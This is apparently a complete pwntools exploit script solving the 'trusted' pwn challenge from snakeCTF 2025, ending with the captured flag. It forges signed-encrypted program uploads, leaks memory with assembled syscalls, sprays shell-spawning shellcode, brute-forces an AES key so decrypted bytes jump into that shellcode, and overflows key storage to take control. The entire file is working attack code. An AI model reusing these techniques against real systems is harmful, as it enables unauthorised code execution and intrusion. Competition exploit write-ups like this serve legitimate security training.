#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *
import base64
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from cryptography.hazmat.primitives.serialization import load_pem_private_key
from cryptography.hazmat.backends import default_backend

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './trusted'
#context.terminal = ['tmux', 'new-window']
context.terminal = ["tmux", "splitw", "-hb"]
argv = []
env = {'FLAG': 'snakeCTF{FLAAAAAAAAAAAAAAAAG_FLAAAAAAAAAAAAAAAAAAAG}'}
#libc = ELF('./libc-2.29.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def mask(addr, target):
    return target ^ (addr >> 12)

def upload_key(key):
    io.sendlineafter(">", str(1))
    io.sendlineafter(">", base64.b64encode(key))

DEC_PROG = 1
ENC_PROG = 2
SIG_ENC_PROG = 3

def upload_sig_enc_program(plaintext: bytes, key_path="my_key.key", priv_path="test_key.pem", corrupt=False) -> bytes:
    io.sendlineafter(">", str(2))
    # AES-256-CBC with PKCS7 padding, sign the ciphertext with Ed25519, then XOR sig with IV

    key = open(key_path, "rb").read()[:32]
    iv = os.urandom(16)

    ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(plaintext, 16))

    priv = load_pem_private_key(open(priv_path, "rb").read(), password=None)
    sig = priv.sign(ct)  # 64 bytes (Ed25519)

    assert(len(sig) == 0x40)

    masked_sig = bytes(b ^ iv[i % 16] for i, b in enumerate(sig))

    payload = p32(SIG_ENC_PROG)
    if corrupt:
        payload += iv + masked_sig + p8(0x41)*0xf # ProgramKind::SIG_ENC_PROG
    else:
        payload += iv + masked_sig + ct  # ProgramKind::SIG_ENC_PROG
    io.sendlineafter(">", base64.b64encode(payload))

def upload_dec_program(data):
    io.sendlineafter(">", str(2))
    payload = p32(DEC_PROG)
    payload += data

    io.sendlineafter(">", base64.b64encode(payload))

def run_program(idx, decrypt=False):
    io.sendlineafter(">", str(3))
    io.sendlineafter(">", str(idx))
    if decrypt:
        io.sendlineafter(">", str(2))
    io.sendlineafter(">", str(1))

def get_program_info(idx):
    io.sendlineafter(">", str(3))
    io.sendlineafter(">", str(idx))

    io.recvuntil("Load Address: ")
    address = int(io.recvline(), 0x10)

    io.recvuntil("IV: ")
    iv = bytes.fromhex(io.recvline().decode().strip())
    # go back
    io.sendlineafter(">", str(3))
    return (iv, address)

def go_back():
    io.sendlineafter(">", str(2))

def forge_sigenc(iv0: bytes, sig_masked0: bytes, ct: bytes, key32: bytes, stub16: bytes) -> bytes:
    assert len(iv0)==16 and len(sig_masked0)==64 and len(ct)>=16 and len(key32)==32 and len(stub16)==16
    C1 = ct[:16]
    D1 = AES.new(key32, AES.MODE_ECB).decrypt(C1)
    new_iv = bytes(d ^ s for d, s in zip(D1, stub16))
    new_sig_masked = bytes(sm ^ i0 ^ i1 for sm, i0, i1 in zip(sig_masked0, iv0 * 4, new_iv * 4))
    return struct.pack("<I", SIG_ENC_PROG) + new_iv + new_sig_masked + ct

# leak remote program bytes
def get_leak_program(binary_sz):
    leak_remote_program = f"""
        mov rax, 0x0
        mov rdi, 0x7
        mov rsi, rsp
        sub rsi, 0x1000
        mov rdx, {binary_sz}
        syscall

        mov rax, 0x1
        mov rdi, 0x1
        mov rdx, {binary_sz}
        syscall

        mov rax, 60
        mov rdi, 0
        syscall
    """

    return leak_remote_program

import multiprocessing as mp

def worker(c, iv, victim_address, addresses, stop_event, q):
    while True:
        if stop_event.is_set():
            break
        key = os.urandom(32)
        d = AES.new(key, AES.MODE_CBC, iv).decrypt(c)
        if d[0] == 0xe9:
            jmp_off = u32(d[1:5], sign="signed")
            for a in addresses:
                target = victim_address + jmp_off
                if target > a and target < a + 0xf80:
                    print("Found good decryption: ", d.hex(), hex(jmp_off+5))
                    print("Key: ", key.hex())
                    q.put(key)
                    stop_event.set()

def brute_decryption(c, iv, victim_address, addresses):
    stop_event = mp.Event()
    q = mp.Queue()
    procs = [mp.Process(target=worker, args=(c, iv, victim_address, addresses, stop_event, q)) for _ in range(0x12)]

    for p in procs: p.start()
    for p in procs: p.join()
    return q.get() if not q.empty() else None

def spray_programs():
    idx = 4

    addresses = []

    key = open("./my_key.key", "rb").read()
    upload_key(key)

    for i in range(0x40):
        sc = asm(shellcraft.sh()).rjust(0x1000, b"\x90")
        upload_sig_enc_program(sc)
        # make region executable
        io.sendlineafter("available", str(2))
        io.sendlineafter(">", str(3))
        io.sendlineafter(">", str(idx+i))

        io.recvuntil("Load Address: ")
        address = int(io.recvline(), 0x10)
        addresses.append(address)

        io.sendlineafter(">", str(2))
        io.sendlineafter(">", str(1))
        io.sendlineafter(">", str(3))

    return addresses

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
set follow-fork-mode parent
continue
'''.format(**locals())
#breakrva 0x4325

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

'''
WRAPPER:
Whitelists syscalls (x86_64 numbers):
    read = 0
    write = 1
    exit = 60
    rt_sigreturn = 15

Verify checks only the ciphertext mapped into memfd, not the IV/key, so replaying ex_sig ciphertext with its signature passes SignedEncryptedProgram::verify.
Decrypt sets DECRYPTED regardless of padding success, so you get VERIFIED+DECRYPTED even with a mismatched key, see EncryptedProgram::decrypt.
By choosing IV = DecK(C1) XOR stub, you fully control the first 16 bytes of the decrypted mapping. Use the stub to read a second-stage and pivot (no wrapper/seccomp on this path).

'''

# we know from remote, encrypted program is 0x30 bytes
# 4 byte type, 16 byte iv, 64 byte masked sig, ciphertext (0x30)
# = 0x84 bytes


'''
dr-x------ 2 h0ps h0ps 11 Aug 30 08:28 .
dr-xr-xr-x 9 h0ps h0ps 0 Aug 30 08:28 ..
lr-x------ 1 h0ps h0ps 64 Aug 30 08:28 0 -> 'pipe:[1053712]'
lrwx------ 1 h0ps h0ps 64 Aug 30 08:28 1 -> /dev/pts/5
lrwx------ 1 h0ps h0ps 64 Aug 30 08:28 10 -> '/memfd:program (deleted)'
lrwx------ 1 h0ps h0ps 64 Aug 30 08:28 2 -> /dev/pts/5
lrwx------ 1 h0ps h0ps 64 Aug 30 08:28 3 -> '/memfd:program (deleted)'
lrwx------ 1 h0ps h0ps 64 Aug 30 08:28 4 -> '/memfd:program (deleted)'
lr-x------ 1 h0ps h0ps 64 Aug 30 08:28 5 -> /home/h0ps/ctfs/snake2025/trusted/default_progs/ex_enc
lrwx------ 1 h0ps h0ps 64 Aug 30 08:28 6 -> '/memfd:program (deleted)'
lr-x------ 1 h0ps h0ps 64 Aug 30 08:28 7 -> /home/h0ps/ctfs/snake2025/trusted/default_progs/ex_sig
lrwx------ 1 h0ps h0ps 64 Aug 30 08:28 8 -> '/memfd:program (deleted)'
lrwx------ 1 h0ps h0ps 64 Aug 30 08:28 9 -> /tmp/prog_GOsV8w


wrapper seccomp:

 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009
 0008: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL

'''

HOST = "trusted.challs.snakectf.org"
PORT = 1337

#print("TEST: ", len(open("default_progs/ex_sig", "rb").read()))

io = start(argv, env=env)
#io = process(["ncat", "--ssl", HOST, str(PORT)])
#io.sendlineafter("token: ", "d666539eec83ee9e97801f8294819322")

(iv, victim_address) = get_program_info(2)

prog = asm(get_leak_program(0x40))
upload_dec_program(prog)

run_program(3)

leak = io.recvuntil("Program executed").split(b"Program")[0][1:]
go_back()

log.info(f"Spraying programs")
addresses = spray_programs()

log.info(f"Bruteforcing decryption key")
# bruteforce decryption to be a jump instruction with an offset into one of
# our sprayed programs in order to execute our shellcode
key = brute_decryption(leak[:16], iv, victim_address, addresses)

# overflow key storage, overwriting the key of ex_sig program
for i in range(255):
    upload_key(key)

run_program(2, decrypt=True)

io.interactive()

# snakeCTF{s1gn3d_&_3ncrypted_flag_1c1972ef80d07ca5}